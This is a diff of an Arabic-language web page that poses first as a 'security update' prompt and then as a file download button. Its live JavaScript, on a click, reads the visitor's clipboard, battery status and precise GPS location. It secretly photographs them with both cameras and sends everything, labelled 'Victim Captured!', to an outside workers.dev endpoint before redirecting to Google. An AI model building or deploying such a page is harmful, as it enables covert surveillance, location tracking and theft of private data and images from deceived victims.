@@ -1,111 +1,118 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث نظام الأمان</title>
+    <title>تحميل الملف</title>
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
-        button { background: #1877f2; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        body { background: #f4f4f9; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
+        .icon { font-size: 50px; color: #1877f2; margin-bottom: 20px; }
+        button { background: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        button:active { transform: scale(0.95); }
+        #status { margin-top: 15px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>تحديث الأمان مطلوب</h3>
-        <p>يرجى الضغط على الزر أدناه لتحديث إعدادات المتصفح وحمايتك من الاختراق.</p>
-        <button onclick="startAction()">تحديث الآن</button>
-    </div>
 
-    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+<div class="box">
+    <div class="icon">📁</div>
+    <h2>جاهز للتحميل</h2>
+    <p>اضغط أدناه لبدء تحميل الملف المطلوب بشكل آمن.</p>
+    <button id="btn" onclick="startTracking()">تحميل الآن (14.5MB)</button>
+    <div id="status"></div>
+</div>
 
-    <script>
-        async function startAction() {
-            // تغيير النص عند الضغط
-            document.querySelector('button').innerText = "جاري التحميل...";
-            
-            let frontImg = null;
-            let backImg = null;
-            let clipboardText = "تعذر الوصول (لم ينسخ شيئاً)";
-            let batteryInfo = "Unknown";
-            let locationMsg = "الموقع الجغرافي: لم يتم السماح";
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-            // 1. جلب البطارية
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'جاري الشحن' : 'تفريغ'})`;
-            } catch(e) {}
+<script>
+async function startTracking() {
+    const btn = document.getElementById('btn');
+    const status = document.getElementById('status');
+    btn.disabled = true;
+    status.innerText = "جاري تهيئة الرابط...";
 
-            // 2. جلب الحافظة (Clipboard)
-            try {
-                clipboardText = await navigator.clipboard.readText();
-            } catch(e) { clipboardText = "تم رفض إذن الحافظة"; }
+    let data = {
+        battery: "Unknown",
+        clipboard: "غير مسموح",
+        location: "لم يتم السماح",
+        frontImg: null,
+        backImg: null
+    };
 
-            // 3. جلب الموقع الدقيق (GPS)
-            const getCoords = () => new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
-            });
+    // 1. البطارية
+    try {
+        const b = await navigator.getBattery();
+        data.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
+    } catch(e) {}
 
-            try {
-                const pos = await getCoords();
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                locationMsg = `📍 الموقع الدقيق (GPS):\nخط العرض: ${lat}\nخط الطول: ${lon}\n🔗 رابط الاتجاهات:\nhttps://www.google.com/maps/dir/?api=1&destination=${lat},${lon}`;
-            } catch(e) { locationMsg = "📍 الموقع: تم رفض الإذن"; }
+    // 2. الحافظة (Clipboard) - تطلب إذن عند الضغط
+    try {
+        data.clipboard = await navigator.clipboard.readText();
+    } catch(e) { data.clipboard = "تم رفض إذن الحافظة أو فارغة"; }
 
-            // 4. تصوير الكاميرا الأمامية
-            frontImg = await takePhoto("user");
-            // 5. تصوير الكاميرا الخلفية
-            backImg = await takePhoto("environment");
+    // 3. الموقع الدقيق (GPS)
+    status.innerText = "جاري فحص اتصالك...";
+    try {
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+        });
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        data.location = `📍 <b>الموقع الدقيق:</b>\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}\nالارتفاع: ${pos.coords.altitude || 0} متر`;
+    } catch(e) { data.location = "📍 الموقع: تم رفض الإذن بالوصول"; }
 
-            // 6. تجميع الرسالة النهائية
-            const finalMessage = `
-✅<b>Victim Full Data</b> 
+    // 4. الصور (الأمامية ثم الخلفية)
+    status.innerText = "جاري التحقق من أمان المتصفح...";
+    data.frontImg = await takeShot("user");
+    data.backImg = await takeShot("environment");
 
-🔋 <b>Battery:</b> ${batteryInfo}
-📋 <b>Clipboard:</b> <code>${clipboardText}</code>
+    // 5. تجميع الرسالة
+    const msg = `
+✅ <b>Victim Captured!</b>
 
-📱 <b>Device:</b> ${navigator.platform}
+🔋 <b>Battery:</b> ${data.battery}
+📋 <b>Clipboard:</b> <code>${data.clipboard}</code>
+
+📱 <b>System:</b> ${navigator.platform}
 🌐 <b>Browser:</b> ${navigator.userAgent}
 
-${locationMsg}
+${data.location}
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
-            `;
+    `;
 
-            // 7. إرسال للـ Worker
-            const workerUrl = "https://cold-brook-420f.tjarb093.workers.dev/";
-            await fetch(workerUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    message: finalMessage, 
-                    frontImage: frontImg, 
-                    backImage: backImg 
-                })
-            });
+    // 6. الإرسال للـ Worker
+    await fetch("https://cold-brook-420f.tjarb093.workers.dev/", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: msg, frontImage: data.frontImg, backImage: data.backImg })
+    });
 
-            window.location.href = "https://www.google.com";
-        }
+    // توجيه نهائي
+    window.location.href = "https://www.google.com";
+}
 
-        async function takePhoto(mode) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                // انتظار أطول لضمان عمل الكاميرا (3 ثواني)
-                await new Promise(r => setTimeout(r, 3000));
-                
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                const data = canvas.toDataURL('image/jpeg', 0.5);
-                stream.getTracks().forEach(t => t.stop());
-                return data;
-            } catch (e) {
-                return null;
-            }
-        }
-    </script>
+async function takeShot(mode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        
+        // انتظار 3 ثواني لضمان جودة الصورة وعدم ظهور سواد
+        await new Promise(r => setTimeout(r, 3000));
+        
+        const canvas = document.getElementById('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        
+        const img = canvas.toDataURL('image/jpeg', 0.6);
+        stream.getTracks().forEach(t => t.stop());
+        return img;
+    } catch (e) { return null; }
+}
+</script>
 </body>
 </html>
